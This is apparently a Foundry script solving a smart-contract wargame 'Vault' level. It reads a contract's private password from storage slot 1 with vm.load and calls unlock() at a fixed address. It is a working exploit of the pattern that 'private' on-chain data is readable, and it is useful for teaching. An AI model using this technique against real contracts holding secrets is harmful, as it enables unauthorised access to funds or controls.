// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Vault} from "../src/Level08.sol";

contract VaultScript is Script {
    Vault public vaultInstance;

    function setUp() public {
        vaultInstance = Vault(0x3A8Bb4472508ac170d6E9ed0B61B32107e65E527);
    }

    function run() public {
        vm.startBroadcast();

        bytes32 passwordValue = vm.load(address(vaultInstance), bytes32(uint256(1)));
        vaultInstance.unlock(passwordValue);

        vm.stopBroadcast();
    }
}
